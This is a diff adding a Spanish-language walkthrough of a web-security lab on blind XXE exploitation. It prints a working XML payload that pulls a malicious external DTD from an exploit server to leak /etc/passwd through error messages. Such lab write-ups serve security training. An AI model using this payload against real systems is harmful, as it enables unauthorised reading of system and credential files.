@@ -188,3 +188,34 @@ Entonces obtenemos que el contenido de **/etc/hostsname** es **f681f51b2be3**. E
 
 ## 6. Lab: Exploiting blind XXE to retrieve data via error messages
 
+```
+Este laboratorio tiene una función "Chack Stock" que analiza la entrada XML pero no muestra el resultado.
+
+Para resolver el laboratorio, use un DTD externo para activar un mensaje de error que muestre el contenido del archivo /etc/passwd.
+
+El laboratorio contiene un enlace a un servidor de exploits en un dominio diferente donde puede alojar su DTD malicioso.
+```
+
+Entonces, vamos al laboratorio e interceptamos en segundo plano todos los paquetes en el burpsuite, entonces vamos a un producto y hacemos clic en **Check stock** y buscamos el paquete en el **Http history** y lo enviamos al **Repeater**.
+
+![](img19.png)
+
+Así que ahora iremos al **Exploit Server** y realizamos la siguiente configuracion.
+
+![](img20.png)
+
+Y le damos en botón **Store**. Configuramos nuestro payload en el repeater, al siguiente valor:
+
+```
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"https://acc61f931f0eeb97800f86cf01820027.web-security-academy.net/malicious.dtd"> %xxe;]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+![](img21.png)
+
+Entonces, como podemos ver, hemos obtenido el contenido del fichero **/etc/passwd** a travéz de un mensaje de error. Ahora, vamos al home para verificar que completamos el laboratorio.
+
+![](img22.png)
+
+## 7. Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
